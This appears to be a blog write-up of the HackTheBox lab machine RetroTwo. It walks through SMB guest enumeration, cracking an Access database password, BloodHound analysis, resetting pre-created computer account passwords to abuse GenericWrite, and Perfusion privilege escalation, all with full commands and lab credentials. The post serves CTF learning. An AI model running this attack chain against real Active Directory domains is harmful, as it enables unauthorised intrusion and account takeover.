---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-08-06-retroTwo-hackthebox
tags:
- hackthebox
- windows

title: retroTwo @ HackTheBox
---

RetroTwo is an easy-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). Initial access is gained by enumerating smb with guest access, a staff.accdb file is obtained but is password protected, cracking the password gives us access to the ldapreader account. Using bloodhound, we find that the fs01 and fs02 computers could be used to gain access to the admws01 computer, abusing the pre-configured computer account, we are able reset the computers password which allows us to abuse the genericWrite over the admws01 computer. Resetting that computers password allows us to add the ldapreader account to the services group, which in turn gives us access to RDP. Root is gained by abusing the Perfusion exploit.

## User & Root Flag
This post is a walkthrough for RetroTwo, a east machine on [hackthebox.eu](https://www.hackthebox.eu). <br>
The initial scan (`nmap -sC -sV -p- -n 10.129.173.72`) shows the following results:
```
┌──(tsunami㉿coffee)-[~]
└─$ nmap -sC -sV -p- -n 10.129.173.72
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 15:26 EDT
Nmap scan report for 10.129.173.72
Host is up (0.017s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-06 19:28:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-08-06T19:30:09+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO2
|   NetBIOS_Domain_Name: RETRO2
|   NetBIOS_Computer_Name: BLN01
|   DNS_Domain_Name: retro2.vl
|   DNS_Computer_Name: BLN01.retro2.vl
|   Product_Version: 6.1.7601
|_  System_Time: 2025-08-06T19:29:29+00:00
| ssl-cert: Subject: commonName=BLN01.retro2.vl
| Not valid before: 2025-03-17T09:40:28
|_Not valid after:  2025-09-16T09:40:28
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-06T19:29:30
|_  start_date: 2025-08-06T19:25:45
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: BLN01
|   NetBIOS computer name: BLN01\x00
|   Domain name: retro2.vl
|   Forest name: retro2.vl
|   FQDN: BLN01.retro2.vl
|_  System time: 2025-08-06T21:29:33+02:00
|_clock-skew: mean: -23m59s, deviation: 53m38s, median: 0s
```

## User

We begin by enumerating SMB for guest access with smbmap.
```
┌──(tsunami㉿coffee)-[~]
└─$ smbmap -H 10.129.173.72 -u 'Guest' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.173.72:445       Name: 10.129.173.72             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Public                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections 
```

Thankfully, we have guest access to the `Public` folder.
Using smbclient, we connect to the drive and download everything inside of it.
```
recurse ON
prompt OFF
mget *
...
staff.accdb
```
Opening the staff.accdb file on a Windows VM shows that it is password protected.
![capture-1](capture-01.PNG)
Using office2john, we are able to create a hash which we can crack.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ office2john DB/staff.accdb > staff_hash
```
Then using john to crack the hash.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ john staff_hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
class08          (staff.accdb)     
1g 0:00:00:12 DONE (2025-08-06 16:02) 0.07788g/s 358.8p/s 358.8c/s 358.8C/s giovanna..class08
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We crack the hash which reveals the password `class08`.
Using this password on the password protected staff.accdb, we find some powershell script.
Looking further into the script, we find a username and password.
```
    strLDAP = "LDAP://OU=staff,DC=retro2,DC=vl"
    strUser = "retro2\ldapreader"
    strPassword = "ppYaVcB5R"
```
![capture-2](capture-02.PNG)

Checking these credentials against smbmap shows that the account exists and is valid.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ smbmap -H 10.129.173.72 -u 'ldapreader' -p 'ppYaVcB5R'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.173.72:445       Name: 10.129.173.72             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Public                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections 
```

## ldapreader
With our new credentials, we'll run bloodhound as there really isn't much to enumerate.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo/blood]
└─$ bloodhound-python -c All -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl -ns 10.129.173.72
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: retro2.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (bln01.retro2.vl:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: bln01.retro2.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: bln01.retro2.vl
INFO: Found 27 users
INFO: Found 43 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: BLN01.retro2.vl
INFO: Done in 00M 05S
```

Looking through bloodhound and checking through `shortest path to domain admin`, we find something unusual..
![capture-3](capture-03.PNG)
Here we see that two computers (fs01 & fs02) are a member of `domain computers` which have genericWrite over `admws01`.
Doing some googling, I find that this is a fairly old vulnerability. link: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts <br>
In short; pre-configured domain computers have their password set as their computer name i.e. if the computer is called fs01, the password will be fs01.
With this in mind, we could reset the computer's password to gain control over it.

Testing this theory with nxc, we find `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` on fs01, which is good!
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ nxc smb retro2.vl -u fs01$ -p fs01
SMB         10.129.173.72   445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.173.72   445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```
This means we have the correct password. To change the computers password, we can use impackets `changepasswd`.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ impacket-changepasswd retro2.vl/fs01\$:fs01@10.129.173.72 -newpass 'P@ssw0rd' -protocol rpc-samr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro2.vl\fs01$
[*] Connecting to DCE/RPC as retro2.vl\fs01$
[*] Password was changed successfully.
```
## fs01$
With our new computer under our control, we can finally abuse the `genericWrite` over `admws01`.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ bloodyAD --host '10.129.173.72' -d 'retro2.vl' -u 'fs01$' -p 'P@ssw0rd' set password admws01$ P@ssw0rdADM
[+] Password changed successfully!
// if bloodAD does not work:
net rpc password 'admws01$' test123 -U retro2.vl/fs01$:test123 -S 10.129.173.72
```

We can test the admws01 password against smb to see if we have access.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ smbmap -H 10.129.173.72 -u admws01$ -p P@ssw0rdADM

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.173.72:445       Name: retro2.vl                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Public                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections 
```

## admws01
Going back to bloodhound, we find that as `admws01` we can add ourselfs to the services group which has RDP access.
Since we have a user account (ldapreader), its best to add them to the services group.
```
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ net rpc group addmem "services" ldapreader -U retro2.vl/'admws01$'%P@ssw0rdADM -S 10.129.173.72

we can confirm we added this user with
net rpc group members "services" -U retro2.vl/'admws01$'%P@ssw0rdADM -S 10.129.173.72
┌──(tsunami㉿coffee)-[~/Documents/retroTwo]
└─$ net rpc group members "services" -U retro2.vl/'admws01$'%P@ssw0rdADM -S 10.129.173.72
RETRO2\inventory
RETRO2\ldapreader
RETRO2\FS01$
```
I had to use net rpc as bloodyAD refused to work properly.

We can finally RDP as ldapreader.
```
xfreerdp3 /u:ldapreader /p:ppYaVcB5R /v:retro2.vl /tls:seclevel:0 // without tls:seclevel:0, this will always fail.
```

## root

Gaining root was fairly straight forwards, as we're on a really old windows 2008 server, there is an old exploit named `perfusion`.
https://github.com/itm4n/Perfusion <br>
First, download this as a .zip, then using visual studio we have to compile it manually.
![capture-6](capture-06.PNG)

After compiling it, we then have to transfer this .exe to the victim (use certutil for this).
Once the victim has recieved the .exe, running it with -c cmd -i, we gain a NT authority shell.
![capture-7](capture-07.PNG)